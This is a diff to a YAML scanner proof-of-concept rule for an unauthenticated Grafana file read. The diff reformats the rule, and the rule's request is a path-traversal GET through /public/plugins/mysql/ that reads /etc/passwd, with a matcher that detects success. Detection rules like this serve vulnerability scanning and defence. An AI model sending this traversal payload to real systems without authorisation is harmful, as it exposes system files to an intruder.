@@ -1,11 +1,15 @@
 name: poc-yaml-grafana-unauth-fileread
+transport: http
 rules:
-  - method: GET
-    path: /public/plugins/mysql/../../../../../../../../../../../../../../../../../etc/passwd
-    expression: |
-      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
-
+    r1:
+        request:
+            method: GET
+            path: "/public/plugins/mysql/../../../../../../../../../../../../../../../../../etc/passwd"
+        expression: |
+            response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+expression:
+    r1()
 detail:
-  author: fuping
-  links:
-    - https://twitter.com/hacker_/status/1467880514489044993
+    author: fuping(link)
+    links:
+        - https://twitter.com/hacker_/status/1467880514489044993
